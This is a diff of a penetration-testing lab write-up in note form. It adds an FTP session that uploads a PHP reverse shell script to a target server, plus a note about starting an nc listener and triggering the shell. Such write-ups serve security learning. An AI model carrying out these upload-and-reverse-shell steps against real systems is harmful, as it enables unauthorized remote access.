@@ -416,5 +416,20 @@ ftp> ls
 > Need to upload a reverse php shell script so plenty to find online but looked on pentest monkey:
 
 ```
-
+ftp> put php-reverse-shell.php
+local: php-reverse-shell.php remote: php-reverse-shell.php
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+5683 bytes sent in 0.00 secs (78.5468 MB/s)
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rwxrwxr-x    1 112      118          5491 Feb 12 18:42 php-reverse-shell.php
+-rwxrwxr-x    1 112      118            20 Feb 12 18:37 test.php
+226 Directory send OK.
+ftp> 
 ```
+
+> [!info]
+> Now to first verify this on the site then setup a NC listener then trigger the reverse shell.php
